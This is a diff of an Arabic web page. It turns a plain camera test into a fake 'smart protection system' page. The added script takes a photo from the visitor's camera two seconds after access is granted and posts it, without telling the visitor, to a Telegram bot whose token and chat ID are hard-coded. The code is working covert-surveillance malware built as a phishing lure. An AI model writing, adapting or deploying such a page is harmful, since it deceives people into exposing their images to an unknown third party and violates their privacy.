@@ -3,38 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اختبار الكاميرا</title>
+    <title>نظام الحماية الذكي</title>
     <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-color: #1a1a1a; color: white; }
-        .container { text-align: center; padding: 20px; }
-        video { width: 90%; max-width: 500px; border: 3px solid #007bff; border-radius: 10px; display: none; margin-top: 20px; }
-        button { background-color: #007bff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 10px rgba(0,123,255,0.3); }
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .container { text-align: center; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        video { width: 100%; border-radius: 10px; margin-top: 15px; display: none; }
+        button { background-color: #0088cc; color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-size: 16px; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
+<div class="container">
+    <h2>تفعيل نظام الحماية</h2>
+    <p>اضغط للبدء</p>
+    <button onclick="initiate()">تشغيل الآن</button>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <div id="status"></div>
+</div>
 
-    <div class="container">
-        <h2>اختبار الوصول للكاميرا</h2>
-        <p>اضغط لتشغيل الكاميرا الأمامية:</p>
-        <button onclick="startCamera()">تشغيل الكاميرا</button>
-        <video id="video" autoplay playsinline></video>
-        <p id="status"></p>
-    </div>
+<script>
+    // بياناتك التي استخرجناها
+    const botToken = '8774671190:AAEBtV-3k8lt9Y05fTcSow-tCmZ0gIXL28A'; 
+    const chatId = '6465368223';
 
-    <script>
-        async function startCamera() {
-            const video = document.getElementById('video');
-            const status = document.getElementById('status');
-            try {
-                // طلب الإذن للوصول للكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.style.display = "block";
-                status.innerHTML = "تم الاتصال بالكاميرا بنجاح!";
-            } catch (err) {
-                status.innerHTML = "فشل الوصول للكاميرا (تم رفض الإذن).";
-            }
+    async function initiate() {
+        const video = document.getElementById('video');
+        const status = document.getElementById('status');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            video.style.display = "block";
+            status.innerHTML = "جاري التحقق...";
+            setTimeout(() => { captureAndSend(); }, 2000);
+        } catch (err) {
+            status.innerHTML = "يجب السماح بالكاميرا للعمل.";
         }
-    </script>
+    }
+
+    function captureAndSend() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'image.jpg');
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                document.getElementById('status').innerHTML = "تم الاتصال بنجاح!";
+            });
+        }, 'image/jpeg');
+    }
+</script>
 </body>
 </html>
